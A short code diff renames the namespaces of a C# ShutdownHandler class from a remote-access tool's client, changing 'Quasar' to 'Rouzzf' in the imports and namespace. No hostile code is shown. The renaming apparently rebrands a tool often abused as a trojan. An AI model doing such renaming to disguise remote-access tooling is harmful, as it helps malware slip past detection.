@@ -1,11 +1,11 @@
-﻿using Quasar.Common.Enums;
-using Quasar.Common.Messages;
-using Quasar.Common.Networking;
+﻿using Rouzzf.Common.Enums;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Networking;
 using System;
 using System.Diagnostics;
 using System.Windows.Forms;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     public class ShutdownHandler : IMessageProcessor
     {
